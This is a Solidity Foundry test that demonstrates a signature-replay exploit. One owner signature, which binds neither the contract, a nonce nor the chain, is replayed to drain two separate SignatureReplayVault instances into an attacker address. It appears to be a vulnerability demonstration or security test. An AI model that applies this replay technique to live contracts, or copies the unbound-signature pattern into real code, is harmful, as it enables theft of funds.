// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "../src/SignatureReplayVault.sol";

contract SignatureReplayVaultTest is Test {
    using ECDSA for bytes32;

    SignatureReplayVault public vaultAlpha;
    SignatureReplayVault public vaultBeta;

    uint256 internal immutable OWNER_KEY = 0xBC71D;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = vm.addr(OWNER_KEY);
        attacker = makeAddr("ATTACKER_NODE");

        vaultAlpha = new SignatureReplayVault{value: 10 ether}(owner);
        vaultBeta = new SignatureReplayVault{value: 10 ether}(owner);
    }

    function test_SignatureReplayExploit() public {
        uint256 exploitAmount = 10 ether;

        bytes32 messageHash = keccak256(abi.encodePacked(attacker, exploitAmount));
        bytes32 ethSignedHash = MessageHashUtils.toEthSignedMessageHash(messageHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_KEY, ethSignedHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.startPrank(attacker);

        vaultAlpha.withdrawWithSignature(exploitAmount, signature);
        assertEq(address(vaultAlpha).balance, 0);

        vaultBeta.withdrawWithSignature(exploitAmount, signature);

        vm.stopPrank();

        assertEq(address(vaultBeta).balance, 0);
        assertEq(attacker.balance, 20 ether);
    }
}
